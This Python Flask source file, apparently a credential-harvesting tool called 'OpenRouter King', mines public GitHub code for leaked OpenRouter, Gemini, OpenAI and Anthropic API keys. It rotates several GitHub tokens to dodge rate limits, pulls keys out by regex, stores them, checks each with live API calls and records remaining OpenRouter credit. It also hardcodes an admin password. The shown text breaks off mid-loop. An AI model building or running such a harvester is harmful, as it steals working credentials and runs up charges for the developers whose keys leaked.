#!/usr/bin/env python3
"""
OpenRouter King - API Key Scanner
Version: 1.1.0
Changelog:
- 调整扫描分配比例: OpenRouter 40%, Gemini 40%, OpenAI 10%, Claude 10%
- 实现数据库版本管理和自动迁移
- 优化扫描策略，重点关注高价值目标
"""
from flask import Flask, render_template, jsonify, request, session
from flask_cors import CORS
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

__version__ = '1.1.0'

app = Flask(__name__)
app.config['SECRET_KEY'] = 'rebuild-minimal-secret'
CORS(app)

import logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')

# 管理员密码（按你的要求硬编码）
ADMIN_PASSWORD = 'Kuns123456.'

import sqlite3, os, json, threading, time, re, requests, random
from urllib import request as urlreq, error as urlerr
DB_PATH = os.path.join(os.path.dirname(__file__), 'app.db')
db_lock = threading.Lock()  # 数据库操作锁

# --- Persistence layer ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS settings (k TEXT PRIMARY KEY, v TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key_value TEXT UNIQUE,
        key_type TEXT,
        status TEXT,
        found_at TEXT,
        last_checked TEXT,
        balance REAL DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS metrics_minutely (
        bucket TEXT PRIMARY KEY,
        total INTEGER DEFAULT 0,
        gemini_valid INTEGER DEFAULT 0,
        gemini_429 INTEGER DEFAULT 0
    )''')
    conn.commit(); conn.close()
# 初始化数据库（确保在调用 _get_setting 之前）
init_db()

# ---- Default scan queries - 重新分配比例: OpenRouter 40%, Gemini 40%, OpenAI 10%, Claude 10% ----
# 基础查询模板
BASE_QUERIES = [
    # OpenRouter 重点关注 (40%)
    'sk-or-v1-', 'sk-or-', 'OPENROUTER_API_KEY', 'openrouter', 'sk-or-v1', 'sk-or',
    # Gemini 查询 (40%)
    'AIza', 'GEMINI_API_KEY', 'GOOGLE_API_KEY', 'gemini', 'google_api',
    # OpenAI 查询 (10%)
    'sk-proj-', 'OPENAI_API_KEY',
    # Anthropic 查询 (10%)
    'sk-ant-', 'ANTHROPIC_API_KEY'
]

# 文件类型
FILE_TYPES = [
    'filename:.env', 'filename:.env.local', 'filename:.env.production', 'filename:.env.staging',
    'filename:.env.development', 'filename:.env.example', 'filename:config.env',
    'extension:py', 'extension:js', 'extension:ts', 'extension:json', 'extension:yaml',
    'extension:yml', 'extension:toml', 'extension:ini', 'extension:conf'
]

# 仓库特征（用于发现新仓库）
REPO_FEATURES = [
    'language:Python', 'language:JavaScript', 'language:TypeScript', 'language:Go',
    'language:Rust', 'language:Java', 'language:PHP', 'language:Ruby',
    'topic:ai', 'topic:ml', 'topic:api', 'topic:bot', 'topic:web', 'topic:app'
]

def generate_dynamic_queries(cycle_count):
    """动态生成多样化的查询，重点关注OpenRouter"""
    import random

    queries = []

    # 分类BASE_QUERIES
    openrouter_patterns = ['sk-or-v1-', 'sk-or-', 'OPENROUTER_API_KEY', 'openrouter', 'sk-or-v1', 'sk-or']
    gemini_patterns = ['AIza', 'GEMINI_API_KEY', 'GOOGLE_API_KEY', 'gemini', 'google_api']
    openai_patterns = ['sk-proj-', 'OPENAI_API_KEY']
    anthropic_patterns = ['sk-ant-', 'ANTHROPIC_API_KEY']

    # 1. OpenRouter重点查询 (40% = 10个)
    for i in range(10):
        key_pattern = random.choice(openrouter_patterns)
        file_type = random.choice(FILE_TYPES)
        queries.append(f'"{key_pattern}" {file_type}')

    # 2. Gemini查询 (40% = 10个)
    for i in range(10):
        key_pattern = random.choice(gemini_patterns)
        file_type = random.choice(FILE_TYPES)
        queries.append(f'"{key_pattern}" {file_type}')

    # 3. OpenAI查询 (10% = 3个)
    for i in range(3):
        key_pattern = random.choice(openai_patterns)
        file_type = random.choice(FILE_TYPES)
        queries.append(f'"{key_pattern}" {file_type}')

    # 4. Anthropic查询 (10% = 2个)
    for i in range(2):
        key_pattern = random.choice(anthropic_patterns)
        file_type = random.choice(FILE_TYPES)
        queries.append(f'"{key_pattern}" {file_type}')

    # 5. 时间范围查询（获取2年内的内容）
    from datetime import datetime, timedelta

    # 计算720天前的日期
    days_720_ago = (datetime.now() - timedelta(days=720)).strftime('%Y-%m-%d')
    days_365_ago = (datetime.now() - timedelta(days=365)).strftime('%Y-%m-%d')
    days_180_ago = (datetime.now() - timedelta(days=180)).strftime('%Y-%m-%d')

    time_ranges = [
        f'pushed:>{days_720_ago}',    # 2年内推送
        f'created:>{days_720_ago}',   # 2年内创建
        f'updated:>{days_365_ago}',   # 1年内更新
        f'pushed:>{days_180_ago}',    # 6个月内推送
    ]

    # 注意：总共25个查询，已经分配完毕
    # OpenRouter: 10个 (40%)
    # Gemini: 10个 (40%)
    # OpenAI: 3个 (12%)
    # Anthropic: 2个 (8%)

    logging.info(f"🎲 Generated {len(queries)} dynamic queries for cycle {cycle_count}")
    return queries

# 重新设计查询分布：OpenRouter 40%, Gemini 40%, OpenAI 10%, Anthropic 10%
DEFAULT_QUERIES = [
    # ========== OpenRouter 专项查询 (40% = 10个) ==========
    '"sk-or-v1-" filename:.env',
    '"sk-or-" filename:.env',
    '"OPENROUTER_API_KEY" filename:.env',
    '"sk-or-v1-" extension:py',
    '"sk-or-" extension:js',
    '"sk-or-" filename:.env.local',
    '"sk-or-" filename:.env.production',
    '"openrouter" extension:env',
    '"sk-or-v1-" extension:json',
    '"OPENROUTER_API_KEY" extension:py',

    # ========== Gemini 查询 (40% = 10个) ==========
    '"AIza" filename:.env',
    '"GEMINI_API_KEY" filename:.env',
    '"GOOGLE_API_KEY" filename:.env',
    '"AIza" extension:js',
    '"AIza" extension:py',
    '"GEMINI_API_KEY" extension:py',
    '"GOOGLE_API_KEY" extension:js',
    '"AIza" filename:.env.local',
    '"AIza" filename:.env.production',
    '"gemini" extension:env',

    # ========== OpenAI 查询 (10% = 3个) ==========
    '"sk-proj-" filename:.env',
    '"OPENAI_API_KEY" filename:.env',
    '"sk-proj-" extension:py',

    # ========== Anthropic 查询 (10% = 2个) ==========
    '"sk-ant-" filename:.env',
    '"ANTHROPIC_API_KEY" filename:.env'
]

def ensure_defaults():
    if _get_setting('scan_queries', None) in (None, []):
        _set_setting('scan_queries', DEFAULT_QUERIES)
    if _get_setting('scan_interval', None) is None:
        _set_setting('scan_interval', 120)  # 11个token保守配置：120秒间隔
    if _get_setting('max_results_per_query', None) is None:
        _set_setting('max_results_per_query', 200)  # 11个token保守配置：每查询200个结果
    if _get_setting('prefer_recent', None) is None:
        _set_setting('prefer_recent', True)
    if _get_setting('recent_days', None) is None:
        _set_setting('recent_days', 30)
    if _get_setting('github_tokens', None) is None:
        _set_setting('github_tokens', [])

def _set_setting(k: str, v):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO settings (k, v) VALUES (?,?)', (k, json.dumps(v)))
    conn.commit(); conn.close()


def _get_setting(k: str, default=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT v FROM settings WHERE k=?', (k,))
    row = c.fetchone(); conn.close()
    if not row: return default
    try:
        return json.loads(row[0])
    except Exception:
        return default

# Call ensure_defaults after defining the helper functions
ensure_defaults()

# Global variables for monitoring
scanner_status = {
    'is_running': False,
    'last_scan_start': None,
    'last_scan_end': None,
    'current_query': None,
    'scanned_count': 0,
    'keys_found_session': 0,
    'errors': []
}

@app.route('/api/config', methods=['GET'])
def api_config_get():
    return jsonify({
        'github_tokens': _get_setting('github_tokens', []),
        'scan_queries': _get_setting('scan_queries', []),
        'scan_interval': _get_setting('scan_interval', 60),
        'max_results_per_query': _get_setting('max_results_per_query', 100),
        'prefer_recent': _get_setting('prefer_recent', True),
        'recent_days': _get_setting('recent_days', 30),
    })

# --- Validation utilities ---
VALIDATE_CFG = {
    'openai': {
        'url': 'https://api.openai.com/v1/models',
            'headers': lambda k: {'Authorization': f'Bearer {k}'},
    },
    'openrouter': {
        'url': 'https://openrouter.ai/api/v1/models',
            'headers': lambda k: {'Authorization': f'Bearer {k}'},
    },
    'anthropic': {
        'url': 'https://api.anthropic.com/v1/models',
        'headers': lambda k: {'x-api-key': k, 'anthropic-version': '2023-06-01'},
    },
    'gemini': {
        'url': 'https://generativelanguage.googleapis.com/v1/models',
        'headers': lambda k: {},  # key via query param
    }
}

def _validate_openrouter_key(kv: str) -> int:
    """使用实际聊天API验证OpenRouter密钥"""
    import requests
    
    headers = {
        'Authorization': f'Bearer {kv}',
        'Content-Type': 'application/json',
        'HTTP-Referer': 'https://github.com',
        'X-Title': 'Key Validation Test'
    }
    
    # 使用最新的免费模型进行测试 (google/gemma-2-9b-it:free 是最新的免费模型之一)
    payload = {
        'model': 'google/gemma-2-9b-it:free',
        'messages': [{'role': 'user', 'content': 'test'}],
        'max_tokens': 1
    }
    
    try:
        response = requests.post(
            'https://openrouter.ai/api/v1/chat/completions',
            headers=headers, 
            json=payload, 
            timeout=15
        )
        return response.status_code
    except Exception:
        return -1

def _validate_gemini_key(kv: str) -> int:
    """使用实际生成API验证Gemini密钥"""
    import requests
    
    # 使用 gemini-1.5-flash 模型进行验证（更新的模型）
    url = f'https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={kv}'
    
    headers = {
        'Content-Type': 'application/json',
    }
    
    # 最小化的测试请求
    payload = {
        'contents': [{
            'parts': [{'text': 'test'}]
        }],
        'generationConfig': {
            'maxOutputTokens': 1,
            'temperature': 0
        }
    }
    
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        
        # 检查HTTP状态码
        if response.status_code == 200:
            # 验证响应是否包含有效内容
            try:
                data = response.json()
                if 'candidates' in data:
                    return 200  # 成功
                elif 'error' in data:
                    return 403  # 有错误
                else:
                    return 403  # 未知格式
            except:
                return 403
        else:
            return response.status_code
            
    except Exception:
        return -1

def _validate_openai_key(kv: str) -> int:
    """使用实际聊天API验证OpenAI密钥"""
    import requests
    
    headers = {
        'Authorization': f'Bearer {kv}',
        'Content-Type': 'application/json'
    }
    
    # 使用最新的便宜模型进行测试 (gpt-4o-mini 是最新且便宜的)
    payload = {
        'model': 'gpt-4o-mini',
        'messages': [{'role': 'user', 'content': 'hi'}],
        'max_tokens': 1
    }
    
    try:
        response = requests.post(
            'https://api.openai.com/v1/chat/completions',
            headers=headers,
            json=payload,
            timeout=15
        )
        
        # 检查HTTP状态码
        if response.status_code == 200:
            return 200
        elif response.status_code == 401:
            return 401  # Invalid API key
        elif response.status_code == 429:
            return 429  # Rate limited or quota exceeded
        elif response.status_code == 403:
            return 403  # Forbidden
        else:
            return response.status_code
            
    except Exception:
        return -1

def _validate_anthropic_key(kv: str) -> int:
    """使用实际消息API验证Anthropic密钥"""
    import requests
    
    headers = {
        'x-api-key': kv,
        'anthropic-version': '2023-06-01',
        'content-type': 'application/json'
    }
    
    # 使用最新的Claude 3.5 Haiku模型（最便宜）
    payload = {
        'model': 'claude-3-5-haiku-20241022',
        'max_tokens': 1,
        'messages': [{'role': 'user', 'content': 'hi'}]
    }
    
    try:
        response = requests.post(
            'https://api.anthropic.com/v1/messages',
            headers=headers,
            json=payload,
            timeout=15
        )
        
        # 检查HTTP状态码和响应内容
        if response.status_code == 200:
            try:
                data = response.json()
                # 检查是否有正常的内容响应
                if 'content' in data and data.get('content'):
                    return 200
                else:
                    return 403
            except:
                return 403
        elif response.status_code == 401:
            return 401  # Invalid API key
        elif response.status_code == 429:
            return 429  # Rate limited
        elif response.status_code == 403:
            return 403  # Forbidden
        else:
            return response.status_code
            
    except Exception:
        return -1

def validate_key_once(kv: str, kt: str) -> int:
    kt = (kt or '').lower()
    
    # 所有模型都使用实际API验证（更准确）
    if kt == 'openrouter':
        return _validate_openrouter_key(kv)
    elif kt == 'gemini':
        return _validate_gemini_key(kv)
    elif kt == 'openai':
        return _validate_openai_key(kv)
    elif kt == 'anthropic':
        return _validate_anthropic_key(kv)
    
    # 未知类型
    return -1


def _update_key_status(kv: str, status_code: int, kt: str):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("UPDATE keys SET status=?, last_checked=? WHERE key_value=?", (str(status_code), now, kv))
    conn.commit(); conn.close()
    # metrics for gemini
    if (kt or '').lower() == 'gemini':
        if status_code == 200:
            _bump_metric(delta_valid=1)
        elif status_code == 429:
            _bump_metric(delta_429=1)


def pick_keys_for_validation(limit=50, stale_minutes=60):
    cutoff = (datetime.now() - timedelta(minutes=stale_minutes)).strftime('%Y-%m-%d %H:%M:%S')
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("SELECT key_value, key_type, last_checked FROM keys WHERE last_checked IS NULL OR last_checked<? LIMIT ?", (cutoff, limit))
    rows = c.fetchall(); conn.close()
    return rows

# --- OpenRouter balance refresher (placeholder lightweight) ---

def _fetch_openrouter_credits(token: str) -> float:
    """使用正确的/key端点查询OpenRouter余额"""
    import requests
    
    try:
        headers = {
            'Authorization': f'Bearer {token}',
            'Accept': 'application/json'
        }
        
        response = requests.get('https://openrouter.ai/api/v1/key', 
                              headers=headers, timeout=12)
        
        if response.status_code != 200:
            return 0.0
            
        data = response.json()
        
        # 根据官方文档格式解析
        if isinstance(data, dict) and 'data' in data:
            key_data = data['data']

            # 获取额度信息
            limit = key_data.get('limit')  # 总额度，null表示无限
            usage = key_data.get('usage', 0)  # 已使用额度

            logging.debug(f"OpenRouter API response: limit={limit}, usage={usage}")

            if limit is None:
                # 无限额度，返回负的使用量来表示（前端会特殊处理）
                return -float(usage) if usage > 0 else -0.01
            elif limit > 0:
                # 有限额度，返回剩余额度
                remaining = max(0, limit - usage)
                return float(remaining)
            else:
                return 0.0

        return 0.0
    except Exception as e:
        logging.debug(f"OpenRouter余额查询失败: {str(e)}")
        return 0.0


def refresh_openrouter_balance():
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("SELECT DISTINCT key_value FROM keys WHERE key_type='openrouter'")
    rows = c.fetchall()
    for (kv,) in rows:
        try:
            bal = _fetch_openrouter_credits(kv)
            c.execute("UPDATE keys SET balance=? WHERE key_value=?", (bal, kv))
            conn.commit()
        except Exception:
            pass
    conn.close()


def balance_loop():
    while True:
        refresh_openrouter_balance()
        time.sleep(600)  # every 10 minutes

threading.Thread(target=balance_loop, daemon=True).start()


def validator_loop():
    def validate_single_key(key_data):
        kv, kt, _last = key_data
        try:
            code = validate_key_once(kv, kt)
            _update_key_status(kv, code, kt)
            return f"✅ {kt}: {code}"
        except Exception as e:
            logging.error(f"❌ Validation error for {kt}: {e}")
            return f"❌ {kt}: error"

    while True:
        rows = pick_keys_for_validation(limit=100, stale_minutes=60)  # 增加批次大小
        if not rows:
            time.sleep(10); continue

        # 4C8G服务器：使用2个线程并发验证
        with ThreadPoolExecutor(max_workers=2) as executor:
            futures = [executor.submit(validate_single_key, row) for row in rows]

            for future in as_completed(futures):
                try:
                    result = future.result()
                    # logging.debug(result)  # 可选：记录验证结果
                except Exception as e:
                    logging.error(f"❌ Validation thread error: {e}")

        time.sleep(5)  # 批次间休息

# 启动验证线程
threading.Thread(target=validator_loop, daemon=True).start()



@app.route('/api/config', methods=['POST'])
def api_config_set():
    if not session.get('is_admin'):
        return jsonify({'status':'unauthorized'}), 401
    data = request.get_json(force=True, silent=True) or {}
    def norm_list(v):
        if isinstance(v, str):
            v = [s.strip() for s in v.replace('\n', ',').split(',') if s.strip()]
        return v or []
    _set_setting('github_tokens', norm_list(data.get('github_tokens')))
    _set_setting('scan_queries', norm_list(data.get('scan_queries')))
    if 'scan_interval' in data: _set_setting('scan_interval', int(data['scan_interval']))
    if 'max_results_per_query' in data: _set_setting('max_results_per_query', int(data['max_results_per_query']))
    if 'prefer_recent' in data: _set_setting('prefer_recent', bool(data['prefer_recent']))
    if 'recent_days' in data: _set_setting('recent_days', int(data['recent_days']))
    return jsonify({'status':'success'})

# --- Scanner utilities ---
GITHUB_API = 'https://api.github.com/search/code?q={q}&per_page={pp}&page={p}'
RAW_MAIN = 'https://raw.githubusercontent.com/{repo}/main/{path}'
RAW_MASTER = 'https://raw.githubusercontent.com/{repo}/master/{path}'

PROVIDER_PATTERNS = {
    # OpenRouter - 支持新旧格式，更宽泛的匹配
    'openrouter': re.compile(r'(sk-or-v1-[A-Za-z0-9\-_]{20,100}|sk-or-[A-Za-z0-9\-_]{20,80})'),
    # OpenAI - 更精确的匹配，避免误判
    'openai': re.compile(r'(sk-proj-[A-Za-z0-9\-_]{20,100}|sk-[A-Za-z0-9]{48,60})'),
    # Anthropic - 保持原有模式
    'anthropic': re.compile(r'(sk-ant-[A-Za-z0-9\-_]{20,80})'),
    # Gemini - 更严格的长度要求，减少误判
    'gemini': re.compile(r'(AIza[0-9A-Za-z\-_]{35,80})')
}

BLACKLIST = ['docs','doc','example','examples','sample','samples','test','tests','spec']


def _save_key(kv: str, kt: str):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    try:
        # 检查key是否已存在
        c.execute("SELECT COUNT(*) FROM keys WHERE key_value = ?", (kv,))
        exists = c.fetchone()[0] > 0

        if exists:
            logging.debug(f"🔄 Key already exists: {kv[:20]}...")
            return False  # 返回False表示未新增
        else:
            c.execute("INSERT INTO keys (key_value, key_type, status, found_at, last_checked, balance) VALUES (?,?,?,?,?,?)",
                      (kv, kt, None, now, None, 0))
            conn.commit()
            logging.debug(f"✅ New key saved: {kt} - {kv[:20]}...")
            return True  # 返回True表示新增
    finally:
        conn.close()


def _bump_metric(delta_total=0, delta_valid=0, delta_429=0):
    b = datetime.now().strftime('%Y-%m-%d %H:%M')
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("SELECT bucket,total,gemini_valid,gemini_429 FROM metrics_minutely WHERE bucket=?", (b,))
    row = c.fetchone()
    if not row:
        c.execute("INSERT INTO metrics_minutely (bucket,total,gemini_valid,gemini_429) VALUES (?,?,?,?)",
                  (b, max(0,delta_total), max(0,delta_valid), max(0,delta_429)))

    else:
        c.execute("UPDATE metrics_minutely SET total=total+?, gemini_valid=gemini_valid+?, gemini_429=gemini_429+? WHERE bucket=?",
                  (max(0,delta_total), max(0,delta_valid), max(0,delta_429), b))
    conn.commit(); conn.close()


def _http_get(url, token=None, timeout=12):
    import requests
    try:
        headers = {'Accept': 'application/vnd.github.v3+json'}
        if token:
            headers['Authorization'] = f'token {token}'
        
        response = requests.get(url, headers=headers, timeout=timeout)
        return response.status_code, response.content
        
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {str(e)}")
        return -1, b''
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")
        return -1, b''


def _fetch_raw(repo, path):
    import requests
    for raw in [RAW_MAIN.format(repo=repo, path=path), RAW_MASTER.format(repo=repo, path=path)]:
        try:
            response = requests.get(raw, timeout=10)
            if response.status_code == 200:
                return response.text
        except Exception as e:
            logging.debug(f"Failed to fetch {raw}: {str(e)}")
            continue
    return ''


def _extract(content: str):
    found = []
    for t, pat in PROVIDER_PATTERNS.items():
        for m in pat.findall(content or ''):
            found.append((t, m))
    return found


manual_scan_requested = False

def scanner_loop():
    global manual_scan_requested
    
    # Example风格的扫描器组件
    class TokenRotator:
        def __init__(self, tokens):
            self.tokens = [t.strip() for t in tokens if t.strip()]
            self._token_ptr = 0
            self._rate_limited_tokens = set()  # 记录被限流的token
            self._last_reset = time.time()

        def next_token(self):
            if not self.tokens:
                return None

            # 每小时重置限流记录
            if time.time() - self._last_reset > 3600:
                self._rate_limited_tokens.clear()
                self._last_reset = time.time()
                logging.info(f"🔄 Reset rate limit tracking, available tokens: {len(self.tokens)}")

            # 找到可用的token
            attempts = 0
            while attempts < len(self.tokens):
                token = self.tokens[self._token_ptr % len(self.tokens)]
                self._token_ptr += 1
                attempts += 1

                if token not in self._rate_limited_tokens:
                    return token.strip()

            # 所有token都被限流，返回第一个（等待重置）
            logging.warning(f"⚠️ All {len(self.tokens)} tokens are rate limited, using first token")
            return self.tokens[0].strip() if self.tokens else None

        def mark_rate_limited(self, token):
            """标记token为限流状态"""
            self._rate_limited_tokens.add(token)
            available = len(self.tokens) - len(self._rate_limited_tokens)
            logging.warning(f"🚫 Token marked as rate limited. Available: {available}/{len(self.tokens)}")
    
    class GitHubSearcher:
        def __init__(self, token_rotator):
            self.token_rotator = token_rotator
        
        def search_for_keys(self, query, max_results=200, max_retries=2):
            all_items = []
            pages_to_scan = min(5, (max_results + 99) // 100)  # 增加到5页，获取更深入的结果

            # 随机起始页，避免总是从第1页开始，扫描更深的页面
            import random
            start_page = random.randint(1, 10)  # 从1-10页随机开始

            for page in range(start_page, start_page + pages_to_scan):
                for attempt in range(1, max_retries + 1):
                    token = self.token_rotator.next_token()
                    if not token:
                        return {"items": all_items, "total_count": len(all_items)}

                    headers = {
                        "Accept": "application/vnd.github.v3+json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Authorization": f"token {token}"
                    }

                    params = {"q": query, "per_page": 100, "page": page}

                    try:
                        response = requests.get("https://api.github.com/search/code", headers=headers, params=params, timeout=30)

                        if response.status_code == 200:
                            result = response.json()
                            items = result.get('items', [])
                            all_items.extend(items)
                            logging.info(f"🔍 Page {page}: [{query[:30]}...] +{len(items)} items (total: {len(all_items)})")

                            # 如果这页没有满100个结果，说明没有更多页了
                            if len(items) < 100:
                                break

                            # 成功获取这页，跳出重试循环
                            break

                        elif response.status_code in (403, 429):
                            # 标记当前token为限流状态
                            self.token_rotator.mark_rate_limited(token)

                            # 11个token优化：动态等待时间
                            base_wait = 5 + (attempt * 3)  # 5s, 8s, 11s
                            wait_time = min(base_wait + random.uniform(0, 2), 30)

                            if attempt < max_retries:
                                logging.warning(f"⚠️ Rate limit page {page} (attempt {attempt}/{max_retries}) - waiting {wait_time:.1f}s")
                                time.sleep(wait_time)
                                continue
                            else:
                                # 达到重试上限，跳过这页继续下一页
                                logging.warning(f"⚠️ Rate limit exceeded for page {page}, skipping to next page")
                                break
                        else:
                            if attempt < max_retries:
                                time.sleep(2)
                                continue
                    except Exception as e:
                        if attempt < max_retries:
                            logging.warning(f"⚠️ Error on page {page} attempt {attempt}: {e}")
                            time.sleep(2)
                            continue
                else:
                    # 所有重试都失败了，跳过这页
                    logging.error(f"❌ Failed to get page {page} after {max_retries} attempts")
                    continue

            return {"items": all_items, "total_count": len(all_items)}
        
        def get_file_content(self, item):
            repo = item["repository"]["full_name"]
            path = item["path"]
            
            for branch in ['main', 'master']:
                raw_url = f"https://raw.githubusercontent.com/{repo}/{branch}/{path}"
                try:
                    response = requests.get(raw_url, timeout=10)
                    if response.status_code == 200:
                        return response.text
                except:
                    continue
            return None
    
    # 持久化文件去重系统
    def init_scanned_files_table():
        """初始化已扫描文件表"""
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        try:
            c.execute('''CREATE TABLE IF NOT EXISTS scanned_files (
                file_sha TEXT PRIMARY KEY,
                repo_name TEXT,
                file_path TEXT,
                first_scanned TEXT,
                last_scanned TEXT,
                scan_count INTEGER DEFAULT 1
            )''')

            # 创建已扫描仓库表
            c.execute('''CREATE TABLE IF NOT EXISTS scanned_repos (
                repo_name TEXT PRIMARY KEY,
                first_scanned TEXT,
                last_scanned TEXT,
                file_count INTEGER DEFAULT 0,
                key_count INTEGER DEFAULT 0
            )''')
            conn.commit()
        finally:
            conn.close()

    def is_file_already_scanned(sha, repo_name, file_path):
        """检查文件是否已经被扫描过"""
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        try:
            c.execute("SELECT scan_count FROM scanned_files WHERE file_sha = ?", (sha,))
            result = c.fetchone()
            if result:
                # 更新扫描记录
                c.execute("""UPDATE scanned_files
                           SET last_scanned = ?, scan_count = scan_count + 1
                           WHERE file_sha = ?""",
                         (datetime.now().strftime('%Y-%m-%d %H:%M:%S'), sha))
                conn.commit()
                return True, result[0]
            return False, 0
        finally:
            conn.close()

    def mark_file_as_scanned(sha, repo_name, file_path):
        """标记文件为已扫描"""
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        try:
            now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            c.execute("""INSERT OR REPLACE INTO scanned_files
                       (file_sha, repo_name, file_path, first_scanned, last_scanned, scan_count)
                       VALUES (?, ?, ?, ?, ?, 1)""",
                     (sha, repo_name, file_path, now, now))
            conn.commit()
        finally:
            conn.close()

    def is_repo_already_scanned(repo_name):
        """检查仓库是否已经被扫描过"""
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        try:
            c.execute("SELECT file_count, key_count FROM scanned_repos WHERE repo_name = ?", (repo_name,))
            result = c.fetchone()
            return result is not None, result if result else (0, 0)
        finally:
            conn.close()

    def mark_repo_as_scanned(repo_name, file_count=0, key_count=0):
        """标记仓库为已扫描"""
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        try:
            now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            c.execute("""INSERT OR REPLACE INTO scanned_repos
                       (repo_name, first_scanned, last_scanned, file_count, key_count)
                       VALUES (?, ?, ?, ?, ?)""",
                     (repo_name, now, now, file_count, key_count))
            conn.commit()
        finally:
            conn.close()

    # 初始化表
    init_scanned_files_table()

    # 临时SHA缓存（用于单个扫描周期内的去重）
    scanned_shas = set()
    blacklist = ['readme', 'docs/', 'doc/', 'example', 'sample', 'test', 'spec', 'demo']
    
    def should_skip_item(item):
        sha = item.get("sha")
        repo_name = item['repository']['full_name']
        file_path = item['path']

        # 1. 临时SHA缓存检查（单个扫描周期内）
        if sha in scanned_shas:
            logging.debug(f"⏭️ Skipping duplicate SHA in current cycle: {sha[:8]}... ({file_path})")
            return True, "cycle_duplicate"

        # 2. 持久化文件检查（跨扫描周期）
        already_scanned, scan_count = is_file_already_scanned(sha, repo_name, file_path)
        if already_scanned:
            logging.debug(f"⏭️ Skipping already scanned file (#{scan_count}): {repo_name}/{file_path}")
            return True, "already_scanned"

        # 3. 文档过滤
        path_lower = file_path.lower()
        if any(token in path_lower for token in blacklist):
            return True, "doc_filter"
        
        # 仓库年龄
        repo_pushed_at = item["repository"].get("pushed_at")
        if repo_pushed_at:
            try:
                repo_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
                if repo_dt < datetime.utcnow() - timedelta(days=730):
                    return True, "age_filter"
            except:
                pass
        
        return False, ""
    
    def extract_and_filter_keys(content):
        raw_keys = []
        for provider, pattern in PROVIDER_PATTERNS.items():
            matches = pattern.findall(content or '')
            for match in matches:
                raw_keys.append((provider, match))
        
        # Example的上下文过滤
        filtered_keys = []
        for provider, key in raw_keys:
            if len(key) < 20:
                continue
            
            context_index = content.find(key)
            if context_index != -1:
                snippet = content[context_index:context_index + 45]
                if "..." in snippet or "YOUR_" in snippet.upper():
                    continue
                if any(placeholder in snippet.upper() for placeholder in ['REPLACE', 'EXAMPLE', 'DEMO', 'TEST']):
                    continue
            
            filtered_keys.append((provider, key))
        
        return filtered_keys
    
    # 主循环
    logging.info("🎪 EXAMPLE-BASED SCANNER STARTED")

    # 扫描周期计数器
    cycle_count = 0

    while True:
        try:
            cycle_count += 1

            # 每个周期清空临时SHA缓存（但保持持久化记录）
            scanned_shas.clear()
            logging.info(f"🔄 Cycle {cycle_count}: Starting fresh scan (persistent file tracking active)")

            # 获取配置
            tokens = _get_setting('github_tokens', [])

            # 使用动态查询生成，提高扫描效率
            if cycle_count % 3 == 0:  # 每3个周期使用动态查询
                queries = generate_dynamic_queries(cycle_count)
                logging.info(f"🎲 Using dynamic queries for cycle {cycle_count}")
            else:
                queries = _get_setting('scan_queries', DEFAULT_QUERIES)
                logging.info(f"📋 Using configured queries for cycle {cycle_count}")

            recent_days = int(_get_setting('recent_days', 365) or 365)
            
            if not tokens or not queries:
                logging.warning("❌ No tokens or queries configured")
                time.sleep(10)
                continue
            
            # 初始化组件
            token_rotator = TokenRotator(tokens)
            searcher = GitHubSearcher(token_rotator)

            # 开始扫描
            scanner_status['is_running'] = True
            scanner_status['last_scan_start'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            # 获取已扫描统计
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM scanned_files")
            total_scanned_files = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM scanned_repos")
            total_scanned_repos = c.fetchone()[0]
            conn.close()

            logging.info(f"🚀 Scan cycle {cycle_count}: {len(queries)} queries, {len(tokens)} tokens, repos: {total_scanned_repos}, files: {total_scanned_files}")
            scanner_status['scanned_count'] = 0
            scanner_status['keys_found_session'] = 0
            
            # Example风格的查询处理
            for query_index, query in enumerate(queries, 1):
                scanner_status['current_query'] = query[:50]

                # 添加多样化搜索策略
                import random

                # 随机排序
                sort_options = ['indexed', 'updated', 'created']
                random_sort = random.choice(sort_options)

                # 随机时间范围（720天内，即2年内的仓库）
                days_720_ago = (datetime.now() - timedelta(days=720)).strftime('%Y-%m-%d')
                days_365_ago = (datetime.now() - timedelta(days=365)).strftime('%Y-%m-%d')
                days_180_ago = (datetime.now() - timedelta(days=180)).strftime('%Y-%m-%d')

                time_filters = [
                    '',  # 无时间限制
                    f'pushed:>{days_720_ago}',    # 2年内推送
                    f'created:>{days_720_ago}',   # 2年内创建
                    f'updated:>{days_365_ago}',   # 1年内更新
                    f'pushed:>{days_180_ago}',    # 6个月内推送
                ]
                time_filter = random.choice(time_filters)

                # 构建最终查询
                if time_filter:
